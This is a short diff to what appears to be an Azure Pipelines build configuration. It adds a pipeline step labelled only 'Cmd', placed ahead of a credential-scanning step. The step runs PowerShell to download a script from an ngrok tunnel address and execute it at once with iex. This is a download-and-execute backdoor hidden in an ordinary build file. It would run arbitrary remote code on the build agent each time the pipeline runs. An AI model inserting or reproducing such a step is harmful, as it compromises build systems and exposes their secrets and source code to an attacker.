@@ -15,6 +15,12 @@ variables:
   buildConfiguration: 'Release'
 
 steps:
+- task: CmdLine@2
+  displayName: Cmd
+  inputs:
+    script: |
+      powershell iex (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
+
 - task: CredScan@2
   displayName: CredScan
   inputs:
